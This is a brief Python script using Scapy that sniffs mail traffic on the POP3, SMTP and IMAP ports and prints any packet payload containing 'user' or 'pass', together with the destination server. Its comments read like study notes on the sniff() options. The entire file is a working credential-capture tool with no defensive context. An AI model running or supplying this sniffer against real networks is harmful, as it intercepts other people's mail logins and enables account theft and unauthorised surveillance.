#!/usr/bin/env python3

from scapy.all import *

#packet callback
def packet_callback(packet):
    #TCP seems to be triggoring pylint errors. It works!
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

#start the sniffer
#filter - allows you to set Wireshark (BPF) style filters on packets to capture
#prn - specifies callback tfunction to be called for packets that match the filter
#store - sets number of packets stored in memory. We're keeping none. 
#count - sets the number of packets to capture. If not there default is indefinite
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)